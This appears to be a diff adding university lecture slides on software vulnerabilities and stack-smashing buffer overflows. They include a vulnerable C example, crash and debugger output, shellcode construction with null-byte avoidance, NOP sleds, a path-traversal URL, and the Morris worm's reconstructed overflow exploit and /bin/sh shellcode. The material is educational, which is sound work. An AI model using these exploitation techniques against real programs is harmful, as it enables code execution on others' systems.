@@ -1,0 +1,896 @@
+\begin{frame}
+    \titlepage
+\end{frame}
+
+\begin{frame}{logistics}
+    \begin{itemize}
+    \item LEX assignment out
+    \item exam in on week
+    \item come with questions on Monday (review)
+    \end{itemize}
+\end{frame}
+
+\begin{frame}{last few times}
+    \begin{itemize}
+    \item ``encrypted'' code
+    \item changing code --- polymorphic, metamorphic
+    \item anti-VM/emulation
+    \item anti-debugging
+    \item stealth
+    \item tunneling
+    \item retroviruses
+    \item memory residence
+    \end{itemize}
+\end{frame}
+
+\section{vulnerabilities}
+
+\begin{frame}{recall: vulnerabilities}
+    \begin{itemize}
+    \item trojans: the vulnerability is the \myemph{user}
+        \begin{itemize}
+        \item and/or the user interface
+        \end{itemize}
+    \item otherwise?
+    \item software \myemph{vulnerability}
+    \vspace{.5cm}
+    \item unintended program behavior \\ that can be used by an adversary
+    \end{itemize}
+\end{frame}
+
+\begin{frame}{vulnerability versus exploit}
+    \begin{itemize}
+    \item exploit --- something that uses a vulnerability to do something
+    \item proof-of-concept --- something = demonstration the exploit is there
+        \begin{itemize}
+        \item example: open a calculator program
+        \end{itemize}
+    \end{itemize}
+\end{frame}
+
+\section{vulnerability classes}
+
+\begin{frame}{recall: software vulnerability types (1)}
+    \begin{itemize}
+    \item \myemph{memory safety} bugs
+        \begin{itemize}
+        \item problems with pointers
+        \item big topic in this course
+        \end{itemize}
+    \item ``injection'' bugs --- \myemph{type confusion}
+        \begin{itemize}
+        \item commands/SQL within name, label, etc.
+        \end{itemize}
+    \item integer overflow/underflow
+    \item \ldots
+    \end{itemize}
+\end{frame}
+
+\begin{frame}{recall: software vulnerability types (2)}
+    \begin{itemize}
+    \item not checking inputs/permissions
+        \begin{itemize}
+        \item \url{http://webserver.com/../../../../file-I-shouldn't-get.txt}
+        \end{itemize}
+    \item almost any 's ``undefined behavior'' in C/C++
+    \item synchronization bugs: time-to-check to time-of-use
+    \item \ldots{} more?
+    \end{itemize}
+\end{frame}
+
+\begin{frame}{vulnerabilities and malware}
+    \begin{itemize}
+    \item ``arbitrary code execution'' vulnerabilities
+    \item method for malware to spread \myemph{when programs aren't shared}
+    \item often more effective than via copying executable
+    \vspace{.5cm}
+    \item<2> recall: Morris worm
+    \end{itemize}
+\end{frame}
+
+\begin{frame}{Morris worm vulnerabilities}
+    \begin{itemize}
+    \item command injection bug in sendmail (later)
+    \item \myemph{buffer overflow in fingerd}
+        \begin{itemize}
+        \item send 536-byte string for 512-byte buffer
+        \item service for looking up user info
+        \item who is ``john@mit''; how do I contact him?
+        \item note: pre-search engine/web
+        \end{itemize}
+    \end{itemize}
+\end{frame}
+
+\begin{frame}{Szor taxonomy of exploits}
+    \begin{itemize}
+    \item Szor divides buffer overflows into first-, second-, third-``generation''
+    \item first-generation: \myemph{simple stack smashing}
+    \item second-generation: other stack/pointer overwriting
+    \item third-generation: format string, heap structure exploits (malloc internals, etc.)
+    \end{itemize}
+\end{frame}
+
+\section{buffer overflows generally}
+
+\begin{frame}{typical buffer overflow pattern}
+    \begin{itemize}
+    \item cause program to write past the end of a buffer
+    \item that somehow causes different code to run
+    \item (usually code the attacker wrote)
+    \end{itemize}
+\end{frame}
+
+\begin{frame}{why buffer overflows?}
+    \begin{itemize}
+    \item probably most common type of vulnerability until recently
+        \begin{itemize}
+        \item (and not by a small margin)
+        \end{itemize}
+    \item when website vulnerabilities became more common
+    \end{itemize}
+\end{frame}
+
+
+\begin{frame}{network worms and overflows}
+    \begin{itemize}
+    \item worms that connect to vulnerable servers:
+    \vspace{.5cm}
+    \item Morris worm included some buffer overflow exploits
+        \begin{itemize}
+        \item in mail servers, user info servers
+        \end{itemize}
+    \item 2001: Code Red worm that spread to web servers (running Microsoft IIS)
+    \end{itemize}
+\end{frame}
+
+\begin{frame}{overflows without servers}
+    \begin{itemize}
+    \item bugs dealing with corrupt files:
+    \vspace{.5cm}
+    \item Adobe Flash (web browser plugin)
+    \item PDF readers
+    \item web browser JavaScript engines
+    \item image viewers
+    \item movie viewers 
+    \item decompression programs
+    \item \ldots
+    \end{itemize}
+\end{frame}
+
+\section{stack smashing}
+
+\begin{frame}{Stack Smashing}
+    \begin{itemize}
+    \item original, most common buffer overflow \myemph{exploit}
+    \item worked for most buffers on the stack
+        \begin{itemize}
+        \item (``work\myemph{ed}''? we'll talk later)
+        \end{itemize}
+    \end{itemize}
+\end{frame}
+
+\begin{frame}[fragile,label=smashing]{Aleph1, Smashing the Stack for Fun and Profit}
+    \begin{itemize}
+    \item ``non-traditional literature''; released 1996
+    \item by Aleph1 AKA Elias Levy
+    \end{itemize}
+\begin{Verbatim}[fontsize=\scriptsize]
+                               .oO Phrack 49 Oo.
+
+                          Volume Seven, Issue Forty-Nine
+                                     
+                                  File 14 of 16
+
+                      BugTraq, r00t, and Underground.Org
+                                   bring you
+
+                     XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX
+                     Smashing The Stack For Fun And Profit
+                     XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX
+
+                                 by Aleph One
+                             aleph1@underground.org
+\end{Verbatim}
+\end{frame}
+
+\subsection{buffer overflow example}
+
+\begin{frame}[fragile,label=vulnCAgain]{vulnerable code}
+\lstset{language=C,style=small}
+\begin{lstlisting}
+void vulnerable() {
+    char buffer[100];
+
+    // read string from stdin
+    scanf("%s", buffer);
+
+    do_something_with(buffer);
+}
+\end{lstlisting}
+\begin{itemize}
+\item<2> \myemph<2>{what if I input 1000 character string?}
+\end{itemize}
+\end{frame}
+
+
+\begin{frame}[fragile,label=charSegfault]{1000 character string}
+\begin{Verbatim}[fontsize=\fontsize{9}{10}\selectfont,commandchars=\\\{\}]
+$ cat 1000-as.txt
+aaaaaaaaaaaaaaaaaaaaaaaa\textit{\normalfont (1000 a's total)}
+$ ./vulnerable.exe <1000-as.txt
+Segmentation fault (core dumped)
+$ 
+\end{Verbatim}
+\end{frame}
+
+
+\begin{frame}[fragile,label=charDebug]{1000 character string -- debugger}
+\begin{Verbatim}[fontsize=\fontsize{9}{10}\selectfont,commandchars=\\\[\]]
+$ gdb ./vulnerable.exe 
+...
+Reading symbols from ./overflow.exe...done.
+(gdb) run <1000-as.txt 
+Starting program: /home/cr4bd/spring2017/cs4630/slides/20170220/overflow.exe <1000-as.txt
+
+Program received signal SIGSEGV, Segmentation fault.
+0x0000000000400562 in vulnerable () at overflow.c:13
+13      }
+(gdb) backtrace
+#0  0x0000000000400562 in vulnerable () at overflow.c:13
+#1  0x6161616161616161 in ?? ()
+#2  0x6161616161616161 in ?? ()
+#3  0x6161616161616161 in ?? ()
+#4  0x6161616161616161 in ?? ()
+...
+...
+...
+#108 0x6161616161616161 in ?? ()
+#109 0x6161616161616161 in ?? ()
+#110 0x6161616161616161 in ?? ()
+#111 0x0000000000000000 in ?? ()
+(gdb) 
+\end{Verbatim}
+\end{frame}
+
+\begin{frame}[fragile,label=vulnAsm]{vulnerable code --- assembly}
+\lstset{language=myasm,style=small}
+\begin{lstlisting}
+vulnerable:
+    subq	$120, %rsp  /* allocate 120 bytes on stack */
+    movq	%rsp, %rsi  /* scanf arg 1 = rsp = buffer */
+    movl	$.LC0, %edi /* scanf arg 2 = "%s" */
+    xorl    %eax, %eax  /* eax = 0 (see calling convention) */
+    call	__isoc99_scanf  /* call to scanf() */
+    movq	%rsp, %rdi  /* do_something_with arg 1 = rsp = buffer */
+    call	do_something_with
+    addq	$120, %rsp  /* deallocate 120 bytes from stack */
+    ret
+\end{lstlisting}
+\begin{itemize}
+\item<2> exercise: stack layout when scanf is running
+\end{itemize}
+\end{frame}
+
+\begin{frame}[fragile,label=vulnStack]{vulnerable code --- stack usage}
+\begin{tikzpicture}
+% FIXME:
+\tikzset{
+    stackBox/.style={very thick},
+    onStack/.style={thick},
+    xscale=1.3,
+}
+\draw[stackBox] (0, 0) rectangle (10, -6);
+\draw[thick,-Latex] (10.25,-5) -- (10.25, -1) node [midway, below, sloped] {increasing addresses};
+\node[at={(5, 0.1)},anchor=south] { highest address (stack started here)};
+\node[at={(5, -6.1)},anchor=north] { lowest address (stack grows here)};
+
+\draw[onStack] (0, -.25) rectangle (10, -1.25) node[midway,align=center,font=\small]
+     {return address for {\tt vulnerable}: \\ \tt 41 02 40 00 00 00 00 00 (0x400241)};
+\draw[onStack,fill=black!20] (0, -1.25) rectangle (10, -2.25) node[midway,align=center,font=\small] {unused space (20 bytes)};
+\draw[onStack,fill=blue!20] (0, -2.25) rectangle (10, -5.25) node[midway,align=center,font=\small] {buffer (100 bytes)};
+
+\draw[onStack] (0, -5.25) rectangle (10, -6) node[midway,align=center,font=\small] {return address for {\tt scanf}};
+
+\begin{visibleenv}<2->
+    \draw[onStack,fill=red!20,opacity=0.9] (0, -5.25) rectangle (10, -1.25) node[midway,align=center,font=\small,text=red!50!black] {{\tt 61 61 61 61 61 61 61 \ldots} (was buffer + unused)};
+    \node[red,at={(5, -1.25)},anchor=north,fill=black!20,align=right,font=\tt\fontsize{9}{10}\selectfont\bfseries] {
+        61 61 $\;$ 61 61  61 61 61 61  61 61 \\ 61 61  61 61 61 61  61 61 
+    };
+\end{visibleenv}
+\begin{visibleenv}<3->
+    \node[inner sep=0.5mm,red,at={(5, -0.75)},anchor=north,fill=white,align=right,font=\tt\fontsize{10}{11}\selectfont\bfseries] {
+        61 61 61 61  61 61 61 61 (0x6161616161616161)
+    };
+\end{visibleenv}
+\begin{visibleenv}<4->
+    \node[draw,thick,red,at={(5, -0.25)},minimum width=13cm,anchor=south,fill=black!20,align=right,font=\tt\fontsize{9}{10}\selectfont\bfseries] {
+        \strut\only<4>{\ldots}\only<5->{\normalfont debugger's guess: return address for {\tt 0x6161\ldots6161}:} \\ 61 61 61 61  61 61 61 61
+    };
+\end{visibleenv}
+\end{tikzpicture}
+\end{frame}
+
+\begin{frame}[fragile,label=theCrash]{the crash}
+\begin{Verbatim}[fontsize=\fontsize{9}{10}\selectfont,commandchars=\\\[\]]
+   0x0000000000400548 <+0>:     sub    $0x78,%rsp
+   0x000000000040054c <+4>:     mov    %rsp,%rsi
+   0x000000000040054f <+7>:     mov    $0x400604,%edi
+   0x0000000000400554 <+12>:    mov    $0x0,%eax
+   0x0000000000400559 <+17>:    callq  0x400430 <__isoc99_scanf@plt>
+   0x000000000040055e <+22>:    add    $0x78,%rsp
+=> 0x0000000000400562 <+26>:    retq   
+\end{Verbatim}
+\begin{itemize}
+\item {\tt retq} tried to jump to {\tt 0x61616161 61616161}
+\item \ldots but there was nothing there
+\item<2-> what if it wasn't invalid?
+\end{itemize}
+\end{frame}
+
+\subsection{return to stack idea}
+
+\begin{frame}[fragile,label=returnToStack]{return-to-stack}
+\begin{tikzpicture}
+% FIXME:
+\tikzset{
+    stackBox/.style={very thick},
+    onStack/.style={thick},
+    xscale=1.3,
+}
+\draw[stackBox] (0, 0) rectangle (10, -6);
+\draw[thick,-Latex] (10.25,-5) -- (10.25, -1) node [midway, below, sloped] {increasing addresses};
+\node[at={(5, 0.1)},anchor=south] { highest address (stack started here)};
+\node[at={(5, -6.1)},anchor=north] { lowest address (stack grows here)};
+
+\draw[onStack] (0, -.25) rectangle (10, -1.25) node[midway,align=center,font=\small] (stackAddr)
+     {return address for {\tt vulnerable}: \\ \fontsize{10}{11}\selectfont\tt\bfseries\color{red}70 fd ff ff  ff ff 00 00 (0x7fff ffff fd70)};
+\draw[onStack,fill=black!20] (0, -1.25) rectangle (10, -2.25) node[midway,align=center,font=\small] {unused space (20 bytes)};
+\draw[onStack,fill=blue!20] (0, -2.25) rectangle (10, -5.25) node[midway,align=center,font=\small] {buffer (100 bytes)};
+
+\draw[onStack] (0, -5.25) rectangle (10, -6) node[midway,align=center,font=\small] {return address for {\tt scanf}};
+
+\begin{visibleenv}<2>
+\draw[-Latex,red,ultra thick] ([yshift=2.5mm]stackAddr.south east) -- ++(.25cm,0cm) |- (0.25, -5);
+\node[anchor=south west,red] at (0.25, -4.75) {
+    machine code for the attacker to run
+};
+\end{visibleenv}
+
+\end{tikzpicture}
+\end{frame}
+
+\begin{frame}<1-2>[label=makeAttack]{constructing the attack}
+\begin{itemize}
+\item \myemph<2>{write ``shellcode'' --- machine code to execute}
+    \begin{itemize}
+    \item often called ``shellcode'' because often intended to get login shell
+    \item (when in a remote application)
+    \end{itemize}
+\item \myemph<3>{insert overwritten return address value}
+\end{itemize}
+\end{frame}
+
+\subsection{writing shellcode}
+
+\begin{frame}{shellcode challenges}
+\begin{itemize}
+\item ideal is like virus code: works in any executable
+\item no linking --- no library functions by name
+\item probably exit application --- can't return normally
+    \begin{itemize}
+    \item (or a bunch more work to restore original return value)
+    \end{itemize}
+\end{itemize}
+\end{frame}
+
+\begin{frame}[fragile,label=virusCodeRecall]{recall: virus code}
+\lstset{
+    language=myasm,
+    style=small,
+    moredelim={**[is][\btHL<2|handout:0>]{~2~}{~end~}},
+    moredelim={**[is][\btHL<3|handout:0>]{~3~}{~end~}},
+}
+\begin{tikzpicture}
+\node (code) {
+\begin{lstlisting}
+    ~2~leal string(%rip), %edi~end~
+    ~3~pushq $0x4004e0~end~ /* address of puts */
+    retq
+string: 
+    .asciz "You have been infected with a virus!"
+\end{lstlisting}
+};
+\node[anchor=north west,align=left,font=\tt] (bits) at (code.south west) {
+\only<2->{{\color{blue!70!black}8d} {\color{green!70!black}3d} {\color{violet}06 00 00 00} (leal)} \\
+\only<3->{{\color{blue!70!black}68} {\color{violet}e0 04 40 00} (pushq)} \\
+\only<4->{{\color{blue!70!black}c3} (retq)} 
+
+};
+\coordinate (codeExplain) at (bits.north east);
+\begin{visibleenv}<2>
+\node[right=0cm of code,draw=red,ultra thick,align=left,font=\small,anchor=north west] at (codeExplain) {
+    {\color{blue!70!black} opcode for lea} \\
+    {\color{green!70!black} ModRM byte}: \\
+    \hspace{.5cm}32-bit displacement; {\tt \%rdi} \\
+    {\color{violet}32-bit offset from instruction} 
+};
+\end{visibleenv}
+\begin{visibleenv}<3>
+\node[right=0cm of code,draw=red,ultra thick,align=left,font=\small,anchor=north west] at (codeExplain) {
+    {\color{blue!70!black} opcode for push 32-bit constant} \\
+    {\color{violet}32-bit \myemph{constant} (extended to 64-bits)}
+};
+\end{visibleenv}
+\end{tikzpicture}
+\end{frame}
+
+\begin{frame}[fragile,label=virusToShell1]{virus code to shell-code (1)}
+\lstset{
+    language=myasm,
+    style=small,
+    moredelim={**[is][\btHL<2|handout:0>]{~2~}{~end~}},
+    moredelim={**[is][\btHL<3|handout:0>]{~3~}{~end~}},
+}
+\begin{tikzpicture}
+\node (code) {
+\begin{lstlisting}
+    ~2~leaq~end~ string(%rip), %rdi
+    ~3~pushq $0x4004e0~end~ /* address of puts */
+    retq
+string: 
+    .asciz "You have been infected with a virus!"
+\end{lstlisting}
+};
+\node[anchor=north west,align=left,font=\tt] (bits) at (code.south west) {
+{\myemph{\textbf{48}} {\color{blue!70!black}8d} {\color{green!70!black}3d} {\color{violet}06 00 00 00}} (\myemph{leaq}) \\
+{{\color{blue!70!black}68} {\color{violet}e0 04 40 00}} (pushq) \\
+{\color{blue!70!black}c3} (retq) \\
+};
+\coordinate (codeExplain) at (bits.north east);
+
+\node[right=0cm of code,draw=red,ultra thick,align=left,font=\small,anchor=north west] at (codeExplain) {
+    {\color{red!90!black} REX prefix for 64-bit} \\
+    {\color{blue!70!black} opcode for lea} \\
+    {\color{green!70!black} ModRM byte}: 32-bit displacement; {\tt \%rdi} \\
+    {\color{violet}32-bit \myemph{offset from instruction}} 
+};
+\begin{visibleenv}<2>
+\node[anchor=north east,red,ultra thick,align=left,fill=white,draw=red] at (code.north east) {
+    leaq not leal \\ stack address > {\tt 0xFFFF FFFF}
+};
+\end{visibleenv}
+\begin{visibleenv}<3>
+\node[anchor=north east,red,ultra thick,align=left,fill=white,draw=red] at (code.north east) {
+    problem: what if we don't know \\
+    where puts is?
+};
+\end{visibleenv}
+\end{tikzpicture}
+\end{frame}
+
+\begin{frame}[fragile,label=virusToShell2]{virus code to shell-code (2)}
+\lstset{
+    language=myasm,
+    style=smaller,
+    moredelim={**[is][\btHL<2|handout:0>]{~2~}{~end~}},
+    moredelim={**[is][\btHL<3|handout:0>]{~3~}{~end~}},
+}
+\begin{tikzpicture}
+\node (code) {
+\begin{lstlisting}
+    /* Linux system call (OS request):
+       write(1, string, length)
+     */
+    leaq string(%rip), %rsi
+    movl $1, %eax
+    movl $37, %edi
+    /* "request to OS" instruction */
+    syscall
+string: 
+    .asciz "You have been infected with a virus!\n"
+\end{lstlisting}
+};
+\node[anchor=north west,align=left,font=\tt] (bits) at (code.south west) {
+{\color{orange!70!black}48} {\color{blue!70!black}8d} {\color{green!70!black}35} {\color{violet}0c 00 00 00} (leaq) \\
+{{\color{blue!70!black}b8} {\color{violet}01 00 00 00}} (movq \%eax) \\
+{\color{blue!70!black}bf} {\color{violet}25 00 00 00} (movq \%edi) \\
+{\color{blue!70!black}0f 05} (syscall) \\
+};
+\coordinate (codeExplain) at (bits.north east);
+\begin{visibleenv}<2>
+\node[anchor=north west,red,ultra thick,align=left,draw=red,fill=white] at (codeExplain) {
+    problem: after syscall --- crash!
+};
+\end{visibleenv}
+
+\end{tikzpicture}
+\end{frame}
+
+\begin{frame}[fragile,label=virusToShell3]{virus code to shell-code (3)}
+\lstset{
+    language=myasm,
+    style=smaller,
+    moredelim={**[is][\btHL<2|handout:0>]{~2~}{~end~}},
+    moredelim={**[is][\btHL<3|handout:0>]{~3~}{~end~}},
+}
+\begin{tikzpicture}
+\node (code) {
+\begin{lstlisting}
+    /* Linux system call (OS request):
+       write(1, string, length)
+     */
+    leaq string(%rip), %rsi
+    movl $1, %eax
+    movl $37, %edi
+    syscall
+    /* Linux system call:
+       exit_group(0)
+     */
+    ~2~movl $231, %eax~end~
+    ~2~xor %edi, %edi~end~
+    ~2~syscall~end~
+string: 
+    .asciz "You have been infected with a virus!\n"
+\end{lstlisting}
+};
+\coordinate (codeExplain) at ([xshift=-3cm]code.north east);
+\begin{visibleenv}<2>
+\node[anchor=north west,draw=red,ultra thick,fill=white] at ([yshift=2cm]codeExplain) {
+    tell OS to exit
+};
+\end{visibleenv}
+\end{tikzpicture}
+\end{frame}
+
+
+% FIXME: plus turning into syscall, then example of execve
+
+\subsection{setting return address}
+
+\againframe<3>{makeAttack}
+
+\begin{frame}{finding/setting return address}
+    \begin{itemize}
+    \item \myemph<2>{examine target executable disassembly}
+        \begin{itemize}
+        \item figure out how much is allocated on the stack below it
+        \item known stack start location to set return address
+        \end{itemize}
+    \item \myemph<3>{guess}
+        \begin{itemize}
+        \item location of return address
+        \item address of maachine code
+        \end{itemize}
+    \end{itemize}
+\end{frame}
+
+\begin{frame}{really, guess??}
+    \begin{itemize}
+    \item how long the could buffer + local variables be?
+    \item how far from the top of the stack could function call be?
+    \end{itemize}
+\end{frame}
+
+\subsection{nop sleds}
+
+\begin{frame}[fragile,label=guessEasier]{making guessing easier (1)}
+\lstset{language=myasm,style=smaller}
+\begin{tikzpicture}
+\node[label={[font=\small]north:normal shellcode}] (normal) {
+\begin{lstlisting}
+xor %eax, %eax
+leaq command(%rip), %rbx
+/* setup "exec" system call */
+...
+...
+mov $11, %al
+syscall
+
+command: .ascii "/bin/sh"
+\end{lstlisting}
+};
+
+\node[anchor=north west,label={[font=\small]north:easier to ``guess'' shellcode}] at (normal.north east) {
+\begin{lstlisting}
+nop /* one-byte nop */
+nop
+nop
+nop
+nop
+nop
+nop
+xor %eax, %eax
+lea command(%rip), %rbx
+...
+...
+command: .ascii "/bin/sh"
+\end{lstlisting}
+};
+\end{tikzpicture}
+\end{frame}
+
+\begin{frame}[fragile,label=guessEasier2]{making guessing easier (2)}
+\begin{itemize}
+\item knowing where return address is stored is easier
+\item based on buffer length + number of locals + compiler
+    \begin{itemize}
+    \item small variation between platforms for an application
+    \end{itemize}
+\item easy to guess --- but can try multiple at once, if needed
+\end{itemize}
+\end{frame}
+
+\begin{frame}[fragile,label=guessedReturnToStack]{guessed return-to-stack}
+\begin{tikzpicture}
+% FIXME:
+\tikzset{
+    stackBox/.style={very thick},
+    onStack/.style={thick},
+    xscale=1.3,
+}
+\draw[stackBox] (0, 0) rectangle (10, -6);
+\draw[thick,-Latex] (10.25,-5) -- (10.25, -1) node [midway, below, sloped] {increasing addresses};
+\node[at={(5, 0.1)},anchor=south] { highest address (stack started here)};
+\node[at={(5, -6.1)},anchor=north] { lowest address (stack grows here)};
+
+\draw[onStack] (0, -.25) rectangle (10, -1.25) node[midway,align=center,font=\small] (stackAddr)
+     {return address for {\tt vulnerable}: \\ \fontsize{10}{11}\selectfont\tt\bfseries\color{red}70 fd ff ff  ff ff 00 00 (0x7fff ffff fd70)};
+\draw[onStack,fill=black!20] (0, -1.25) rectangle (10, -2.25) node[midway,align=center,font=\small] {unused space (20 bytes)};
+\draw[onStack,fill=blue!20] (0, -2.25) rectangle (10, -5.25) node[midway,align=center,font=\small] {buffer (100 bytes)};
+
+\draw[onStack] (0, -5.25) rectangle (10, -6) node[midway,align=center,font=\small] {return address for {\tt scanf}};
+
+\draw[onStack,fill=green!20,opacity=0.9] (0, -5.25) rectangle (10, -3) node[midway,align=center,font=\small] {nops (was part of buffer)};
+\draw[onStack,fill=red!20,opacity=0.9] (0, -3) rectangle (10, -1.25) node[midway,align=center,font=\small,text=red!50!black] {machine code (was buffer + unused)};
+
+\draw[-Latex,red,ultra thick,dashed] ([yshift=2.5mm]stackAddr.south east) -- ++(.25cm,0cm) |- (0.25, -5);
+\draw[-Latex,red,ultra thick,dashed] ([yshift=2.5mm]stackAddr.south east) -- ++(.25cm,0cm) |- (7.4, -3.5);
+
+\end{tikzpicture}
+\end{frame}
+
+\subsection{writing shellcode: restrictions}
+
+\begin{frame}{some logistical issues}
+    \begin{itemize}
+    \item Sure, 1000 {\tt a}'s can be read by {\tt scanf} with {\tt \%s}, but machine code?
+    \end{itemize}
+\end{frame}
+
+\begin{frame}{scanf accepted characters}
+    \begin{itemize}
+    \item {\tt \%s} --- ``Matches a sequence of non-white-space characters''
+    \item can't use:
+        \begin{itemize}
+        \item {\tt\textvisiblespace}
+        \item {\tt\textbackslash t}
+        \item {\tt\textbackslash v} (``vertical tab'')
+        \item {\tt\textbackslash r} (``carriage return'')
+        \item {\tt\textbackslash n}
+        \end{itemize}
+    \item not actually that much of a restriction
+    \item what about {\tt \textbackslash 0} --- we used a lot of those
+    \end{itemize}
+\end{frame}
+
+\begin{frame}[fragile,label=virusNoZeroes]{shell code without 0s}
+\lstset{
+    language=myasm,
+    style=smaller,
+    moredelim={**[is][\btHL<2|handout:0>]{~2~}{~end~}},
+    moredelim={**[is][\btHL<3|handout:0>]{~3~}{~end~}},
+}
+\begin{tikzpicture}
+\node (code) {
+\begin{lstlisting}
+shellcode:
+    ~2~jmp afterString~end~
+string:
+    .ascii "You have been..."
+afterString:
+    ~3~leaq string(%rip), %rsi~end~
+    xor %eax, %eax
+    xor %edi, %edi
+    ~2~movb $1, %al~end~
+    ~2~movb $37, %dl~end~
+    syscall
+    ~2~movb $231, %al~end~
+    xor %edi, %edi
+    syscall
+\end{lstlisting}
+};
+\begin{visibleenv}<2>
+\node[draw=red,ultra thick,right=.5cm of code,align=left]{
+    one-byte constants/offsets \\
+    so no leading zero bytes \\
+    {\tt jmp afterString} is {\tt eb 25} \\
+    \hspace{.5cm} (jump forward {\tt 0x25} bytes) \\
+    {\tt movb \$1, \%al} is {\tt b0 01}
+};
+\end{visibleenv}
+\begin{visibleenv}<3>
+\node[draw=red,ultra thick,right=.5cm of code,align=left]{
+    four-byte offset, but negative \\
+    {\tt d4 ff ff ff} (-44)
+};
+\end{visibleenv}
+\end{tikzpicture}
+\end{frame}
+
+\begin{frame}[fragile,label=virusNoZeroesFull]{shell code without 0s}
+\begin{Verbatim}[fontsize=\fontsize{9}{10}\selectfont]
+0000000000000000 <shellcode>:
+   0:   eb 25                   jmp    27 <afterString>
+
+0000000000000002 <string>:
+    ...
+
+0000000000000027 <afterString>:
+  27:   48 8d 35 d4 ff ff ff    lea    -0x2c(%rip),%rsi        # 2 <string>
+  2e:   31 c0                   xor    %eax,%eax
+  30:   31 ff                   xor    %edi,%edi
+  32:   b0 01                   mov    $0x1,%al
+  34:   b2 25                   mov    $0x25,%dl
+  36:   0f 05                   syscall 
+  38:   b0 e7                   mov    $0xe7,%al
+  3a:   31 ff                   xor    %edi,%edi
+  3c:   0f 05                   syscall 
+\end{Verbatim}
+\end{frame}
+
+% FIXME: example: what about no \0s
+
+\begin{frame}{x86 flexibility}
+    \begin{itemize}
+    \item x86 opcodes that are normal ASCII chars are pretty flexibile
+    \item {\tt 0}--{\tt 5}
+        \begin{itemize}
+        \item various forms of {\tt xor}
+        \end{itemize}
+    \item {\tt @}, {\tt A}--{\tt Z}, {\tt [}, {\tt \textbackslash}, {\tt ]}, {\tt \textasciicircum}, {\tt \_}
+        \begin{itemize}
+        \item {\tt inc}, {\tt dec}, {\tt push}, {\tt pop} with first eight 32-bit registers
+        \end{itemize}
+    \item {\tt h} --- push one-byte constant
+    \item {\tt p}--{\tt z} --- conditional jumps to 1-byte offset
+    \vspace{.5cm}
+    \item<2> note: can \myemph{write machine code, jump to it}
+    \end{itemize}
+\end{frame}
+
+\begin{frame}{actual limitation}
+    \begin{itemize}
+    \item overwriting address? 
+        \begin{itemize}
+        \item probably can't make sure that's all normal ASCII chars
+        \end{itemize}
+    \item but flexibility also useful in other exploits
+    \end{itemize}
+\end{frame}
+
+\subsection{more trivial overflow}
+
+\begin{frame}[fragile,label=overwriteLocal]{aside: simpler overflow}
+\lstset{
+    language=C,
+    style=smaller,
+    moredelim={**[is][\btHL<2|handout:0>]{@hi2@}{@endhi@}},
+}
+\begin{lstlisting}
+struct QuizQuestion questions[NUM_QUESTIONS];
+int giveQuiz() {
+    int @hi2@score@endhi@ = 0;
+    char @hi2@buffer@endhi@[100];
+    for (int i = 0; i < NUM_QUESTIONS; ++i) {
+        gets(buffer);
+        if (checkAnswer(buffer, &questions[i])) {
+            score += 1;
+        }
+    }
+    return score;
+}
+\end{lstlisting}
+\end{frame}
+
+\begin{frame}[label=overwriteLocalStack]{simpler overflow: stack}
+\begin{tikzpicture}
+\tikzset{
+    stackBox/.style={very thick},
+    onStack/.style={thick},
+}
+\draw[stackBox] (0, 0) rectangle (10, -6);
+\draw[thick,-Latex] (10.25,-5) -- (10.25, -1) node [midway, below, sloped] {increasing addresses};
+\node[at={(5, 0.1)},anchor=south] { highest address (stack started here)};
+\node[at={(5, -6.1)},anchor=north] { lowest address (stack grows here)};
+
+\draw[onStack] (0, -.25) rectangle (10, -1.25) node[midway,align=center,font=\small] (stackAddr)
+     {return address for {\tt giveQuiz}};
+\draw[onStack,fill=green!20] (0, -1.25) rectangle (10, -1.75) node[midway,align=center,font=\small] {
+    score (4 bytes): \only<1>{\tt 00 00 00 00}
+    \only<2>{\color{red}\tt 61 61 61 00}
+};
+\draw[onStack,fill=blue!20] (0, -1.75) rectangle (10, -5.25) node[midway,align=center,font=\small] {buffer (100 bytes)};
+
+\draw[onStack] (0, -5.25) rectangle (10, -6) node[midway,align=center,font=\small] {return address for {\tt gets}};
+
+\begin{visibleenv}<2>
+\node[anchor=south west,font=\tt,red] at (0, -5.25) { aaaa\ldots };
+\node[anchor=north east,font=\tt,red] at (10, -1.75) { \ldots aaaa};
+\node[red] at (5, -3) {input: 103 {\tt a}'s ({\tt a} = {\tt 0x61})};
+\end{visibleenv}
+\end{tikzpicture}
+\end{frame}
+
+\section{stack smashing/overflow summary}
+
+\begin{frame}{buffer overflows and exploitability}
+    \begin{itemize}
+    \item I'm safe because \ldots
+    \vspace{.5cm}
+    \item my buffers are on the stack
+    \item they can write one thing past the buffer
+    \item some other mitigation against stack smashing
+    \end{itemize}
+    \begin{tikzpicture}[overlay,remember picture]
+        \node[fill=white,draw=red,ultra thick,anchor=center,font=\Large,align=center] at (current page.center) {
+            probably not safe \\
+            there's more than stack smashing
+        };
+    \end{tikzpicture}
+\end{frame}
+
+\begin{frame}[fragile,label=morrisEx]{actual example: Morris worm}
+\begin{lstlisting}[language=C,style=smaller]
+    /* reconstructed from machine code */
+    for(i = 0; i < 536; i++) buf[i] = '\0';
+    for(i = 0; i < 400; i++) buf[i] = 1;
+    /* actual shellcode */
+    memcpy(buf + i,
+        ("\335\217/sh\0\335\217/bin\320\032\335\0"
+         "\335\0\335Z\335\003\320\034\\274;\344"
+         "\371\344\342\241\256\343\350\357"
+         "\256\362\351"),
+         28);
+    /* frame pointer, return val, etc.: */
+    *(int*)(&buf[556]) = 0x7fffe9fc;			
+    *(int*)(&buf[560]) = 0x7fffe8a8;
+    *(int*)(&buf[564]) = 0x7fffe8bc;
+    ...
+    send(to_server, buf, sizeof(buf))
+    send(to_server, "\n", 1);
+\end{lstlisting}
+\end{frame}
+
+\begin{frame}[fragile,label=morrisShell]{Morris shellcode (VAX)}
+\begin{lstlisting}[language=myasm,morekeywords=chmk]
+pushl   $68732f      // "/sh\0"
+pushl   $6e69622f    // "/bin"
+movl    sp, r10
+pushl   $0
+pushl   $0
+pushl   r10
+pushl   $3
+movl    sp,ap
+chmk    $3b
+\end{lstlisting}
+\begin{itemize}
+\item setup: run command prompt (``shell'')
+\item after overflow: send commands to run
+\end{itemize}
+\end{frame}
+
+\begin{frame}{stack smashing summary}
+    \begin{itemize}
+    \item setup:
+        \begin{itemize}
+        \item buffer on the stack
+        \item attacker controls what gets written \myemph{past the end}
+        \end{itemize}
+    \item overwrite \myemph{return address} with address of (part of) buffer
+    \item execution goes to attacker machine code when function returns
+    \end{itemize}
+
+    % FIXME: more summary
+\end{frame}
+
+
